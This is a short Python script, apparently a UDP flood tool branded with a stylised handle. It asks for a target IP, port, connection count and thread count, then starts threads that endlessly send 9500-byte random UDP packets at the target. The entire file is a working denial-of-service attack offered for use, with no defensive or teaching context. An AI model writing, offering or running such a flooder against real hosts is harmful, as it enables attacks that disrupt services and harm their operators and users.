#𝙂𝙯𝙖𝙖𝙭𝙮𝙯..
import random
import socket
import threading

print('''𝙂𝙯𝙖𝙖𝙭𝙮𝙯''')

ip = str(input("ip:"))
port = int(input("Port:"))
times = int(input("Connections:"))
threads = int(input("Threading:"))
def run():
	data = random._urandom(9500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("!! 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!!")
		except:
			print("!! 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 !!!")

for y in range(threads):
		th = threading.Thread(target = run)
		th.start()